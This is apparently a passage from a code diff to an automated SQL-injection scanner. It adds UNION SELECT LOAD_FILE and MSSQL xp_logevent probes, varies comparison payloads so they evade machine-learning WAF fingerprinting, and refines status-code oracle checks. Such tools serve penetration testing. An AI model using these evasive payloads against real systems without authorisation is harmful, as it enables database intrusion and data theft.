+                probes.append(f"{_dlc_pfx} UNION SELECT LOAD_FILE('/nonexistent_{marker}')--")
         elif dbms == "MSSQL":
             probes = [
                 f"{_dlc_pfx}; EXEC xp_logevent 99999, N'SQR_LOG_{marker}', informational--",
@@ -97079,9 +97513,20 @@ class MetamorphicPayloadEngine:
 
     COMPARISON_EQUIV = {
         "=":      ["LIKE", "<=>", "REGEXP '^{v}$'", "IN ('{v}')"],
-        ">":      ["NOT <=", "BETWEEN {v}+1 AND 9999999",
+        # BUG-COMPARISON-EQUIV-FIXED-SENTINEL FIX: fixed upper/lower bounds (9999999/-9999999)
+        # create detectable ML-WAF fingerprints — every probe has the same constant. Fix: use
+        # a pool of diverse sentinel values so random.choice varies the bound per invocation.
+        ">":      ["NOT <=",
+                   "BETWEEN {v}+1 AND 9999999",
+                   "BETWEEN {v}+1 AND 8388607",
+                   "BETWEEN {v}+1 AND 2147483647",
+                   "BETWEEN {v}+1 AND 16777215",
                    "NOT IN (SELECT * FROM (SELECT {v} UNION SELECT {v}-1) t)"],
-        "<":      ["NOT >=", "BETWEEN -9999999 AND {v}-1"],
+        "<":      ["NOT >=",
+                   "BETWEEN -9999999 AND {v}-1",
+                   "BETWEEN -8388608 AND {v}-1",
+                   "BETWEEN -2147483648 AND {v}-1",
+                   "BETWEEN -16777216 AND {v}-1"],
         "LIKE":   ["REGEXP", "SOUNDS LIKE", "= "],
     }
 
@@ -97979,11 +98424,13 @@ class ScannerV11(ScannerV10):
                         _bl_pcv_body2: bytes = getattr(_bl_pcv_first2, "body", b"") if _bl_pcv_first2 is not None else b""
                         _norm_base_pcv = ResponseNormaliser.normalise(_bl_pcv_body2)
                         _false_p = _pcv_cascade._make_false_payload(_det_for_pcv.payload) or ""
+                        _pcv_det_method_sg = (getattr(_det_for_pcv, 'method', None) or '').strip()
+                        _pcv_method_sg = _pcv_det_method_sg.upper() if _pcv_det_method_sg else ep.method.upper()
                         _fp_t = await _pcv_cascade._safe_confirm(
-                            ep.method, ep.url, ep_data, ep_fmt, param,
+                            _pcv_method_sg, ep.url, ep_data, ep_fmt, param,
                             orig_val + _det_for_pcv.payload, tamper_chain)
                         _fp_f = await _pcv_cascade._safe_confirm(
-                            ep.method, ep.url, ep_data, ep_fmt, param,
+                            _pcv_method_sg, ep.url, ep_data, ep_fmt, param,
                             orig_val + _false_p, tamper_chain) if _false_p else None
                         # BUG-SCAN-SURFACE-PCV-NOSNIFF FIX: sniff payload mechanism before PCV
                         # so SLEEP/error/UNION payloads through NV/WB/EX/HY surfaces route to
@@ -102828,11 +103275,13 @@ class ScannerV12(ScannerV11):
                         _bl_pcv_body2: bytes = getattr(_bl_pcv_first2, "body", b"") if _bl_pcv_first2 is not None else b""
                         _norm_base_pcv = ResponseNormaliser.normalise(_bl_pcv_body2)
                         _false_p = _pcv_cascade._make_false_payload(_det_for_pcv.payload) or ""
+                        _pcv_det_method_sg = (getattr(_det_for_pcv, 'method', None) or '').strip()
+                        _pcv_method_sg = _pcv_det_method_sg.upper() if _pcv_det_method_sg else ep.method.upper()
                         _fp_t = await _pcv_cascade._safe_confirm(
-                            ep.method, ep.url, ep_data, ep_fmt, param,
+                            _pcv_method_sg, ep.url, ep_data, ep_fmt, param,
                             orig_val + _det_for_pcv.payload, tamper_chain)
                         _fp_f = await _pcv_cascade._safe_confirm(
-                            ep.method, ep.url, ep_data, ep_fmt, param,
+                            _pcv_method_sg, ep.url, ep_data, ep_fmt, param,
                             orig_val + _false_p, tamper_chain) if _false_p else None
                         # BUG-SCAN-SURFACE-PCV-NOSNIFF FIX: sniff payload mechanism before PCV
                         # so SLEEP/error/UNION payloads through NV/WB/EX/HY surfaces route to
@@ -109742,6 +110191,34 @@ class TechniqueCascadeEngine:
                     _len_pct = abs(_len_t - _len_f) / _len_max
                     if _len_pct > 0.05 and abs(_len_t - _len_f) > 50:
                         _passing_pairs.append((_len_pct, f"{_name}+size({_len_t}vs{_len_f})", _len_pct > 0.15))
+                # BUG-CHECKA-STATUS-ORACLE-FIX (Fix 9, HIGH):
+                # On status-code oracles (True=400, False=200/404), the SQL condition
+                # changes the HTTP status code, not the body content. When the body stays
+                # structurally similar between true and false canary probes (same HTML error
+                # page template), SimHash gap ≈ 0 → body-size delta ≈ 0 → Check A fails
+                # even though the injection is real and working.
+                # Fix: when _pcv_bool_true_is_4xx=True (calibrated True→4xx oracle), check
+                # whether the true/false canary probes produce DIFFERENT status codes that
+                # match the calibrated oracle polarity. Status-code divergence that mirrors
+                # the calibrated True/False polarity is direct evidence of injection — the
+                # SQL condition is controlling the app's response code.
+                # Guard: only fire when status codes differ AND one matches the calibrated
+                # True status. Exclude _both_check_a_waf (both probes WAF-blocked → status
+                # divergence is WAF behavior, not injection).
+                if not _passed and not _both_check_a_waf and _pcv_bool_true_is_4xx:
+                    _ca_st_t = getattr(_fp_t, 'status_code', None) if _fp_t else None
+                    _ca_st_f = getattr(_fp_f, 'status_code', None) if _fp_f else None
+                    if (_ca_st_t is not None and _ca_st_f is not None
+                            and _ca_st_t != _ca_st_f):
+                        # Status codes diverged — check polarity match
+                        _ca_t_matches = (_pcv_bool_true_status is not None
+                                         and _ca_st_t == _pcv_bool_true_status)
+                        _ca_f_matches = (_pcv_bool_true_status is not None
+                                         and _ca_st_f != _pcv_bool_true_status)
+                        if _ca_t_matches and _ca_f_matches:
+                            # True canary → calibrated True status; False canary → different status
+                            # This matches the oracle polarity exactly → real injection evidence.
+                            _passing_pairs.append((1.0, f"{_name}+status({_ca_st_t}vs{_ca_st_f})", True))
                 # BUG-4-FIX (Req 3): Early-exit requires 2 pairs from DIFFERENT probe
                 # families.  Previously two passing pairs from the same family (e.g. two
                 # size-based entries from one derived probe) could satisfy the 2-pair
@@ -110481,6 +110958,29 @@ class TechniqueCascadeEngine:
                     _fp_f = _d_fps["false"]
                     _h_true = {k.lower(): v for k, v in (getattr(_fp_t, 'headers', {}) or {}).items()}
                     _h_false = {k.lower(): v for k, v in (getattr(_fp_f, 'headers', {}) or {}).items()}
+                    # BUG-CHECKD-STATUSCODE-DRIVEN-DIFF FIX (Fix 10, HIGH):
+                    # On status-code oracles (True=400 WAF-blocked, False=200/404 app response),
+                    # the Check D boolean canary probes produce different HTTP status codes:
+                    #   True canary  → SUBSTRING condition is SQL-True → oracle status 400 (WAF block)
+                    #   False canary → SUBSTRING condition is SQL-False → oracle status 200/404 (app)
+                    # Different status codes inherently produce different page bodies → different
+                    # content-length and content-type headers. This is status-code-driven variation,
+                    # NOT SQL injection-driven data variation. Counting these diffs as evidence of
+                    # injection creates false positives: content-length + content-type = 2 dynamic
+                    # diffs → _d_pass = True on any True=400 oracle target.
+                    # Fix: detect when the true/false canary responses have different status codes
+                    # in WAF_4XX territory (one is 4xx WAF, other is not), and exclude
+                    # content-length and content-type from dynamic_headers in that case.
+                    # The status difference itself IS evidence of injection — but that's Check B/C
+                    # territory, not a header-diff signal. Check D must measure header diffs that
+                    # are INDEPENDENT of the status code difference.
+                    _WAF_4XX_CODES = {400, 403, 406, 429, 444, 451}
+                    _d_st_t = getattr(_fp_t, 'status_code', 0) or 0
+                    _d_st_f = getattr(_fp_f, 'status_code', 0) or 0
+                    _d_status_driven = (
+                        (_d_st_t in _WAF_4XX_CODES and _d_st_f not in _WAF_4XX_CODES) or
+                        (_d_st_f in _WAF_4XX_CODES and _d_st_t not in _WAF_4XX_CODES)
+                    )
                     # BUG-D2 FIX: Exclude dynamic-only headers from security-diff count.
                     # content-length/etag vary on dynamic pages without injection (CSRF tokens,
                     # timestamps) → false positives.  Require 2+ SECURITY-relevant diffs
@@ -110570,7 +111070,18 @@ class TechniqueCascadeEngine:
                     # neither header reflects SQL injection — both reflect CDN encoding variation.
                     # Fix: remove content-type. Three-way dynamic confirmation now requires ≥2 of
                     # [content-length, etag, last-modified, vary] — all more meaningful than content-type.
-                    _dynamic_headers = ["content-length", "etag", "last-modified", "vary"]
+                    # BUG-CHECKD-STATUSCODE-DRIVEN-DIFF FIX (continued):
+                    # When _d_status_driven=True, content-length ALWAYS differs between
+                    # the two responses because different status-code pages have different
+                    # HTML body sizes. Excluding content-length prevents this from creating
+                    # a spurious _dynamic_diffs >= 1 pass. etag/last-modified/vary remain
+                    # valid: they reflect caching metadata differences that can legitimately
+                    # signal injection-driven data changes independent of status codes.
+                    _dynamic_headers = (
+                        ["etag", "last-modified", "vary"]
+                        if _d_status_driven
+                        else ["content-length", "etag", "last-modified", "vary"]
+                    )
                     _security_diffs = []
                     _dynamic_diffs = []
                     for hdr in _backend_headers:
@@ -130629,11 +131140,13 @@ class ScannerV14(ScannerV13):
                         _bl_pcv_body2: bytes = getattr(_bl_pcv_first2, "body", b"") if _bl_pcv_first2 is not None else b""
                         _norm_base_pcv = ResponseNormaliser.normalise(_bl_pcv_body2)
                         _false_p = _pcv_cascade._make_false_payload(_det_for_pcv.payload) or ""
+                        _pcv_det_method_sg = (getattr(_det_for_pcv, 'method', None) or '').strip()
+                        _pcv_method_sg = _pcv_det_method_sg.upper() if _pcv_det_method_sg else ep.method.upper()
                         _fp_t = await _pcv_cascade._safe_confirm(
-                            ep.method, ep.url, ep_data, ep_fmt, param,
+                            _pcv_method_sg, ep.url, ep_data, ep_fmt, param,
                             orig_val + _det_for_pcv.payload, tamper_chain)
                         _fp_f = await _pcv_cascade._safe_confirm(
-                            ep.method, ep.url, ep_data, ep_fmt, param,
+                            _pcv_method_sg, ep.url, ep_data, ep_fmt, param,
                             orig_val + _false_p, tamper_chain) if _false_p else None
                         # BUG-SCAN-SURFACE-PCV-NOSNIFF FIX: sniff payload mechanism before PCV
                         # so SLEEP/error/UNION payloads through NV/WB/EX/HY surfaces route to
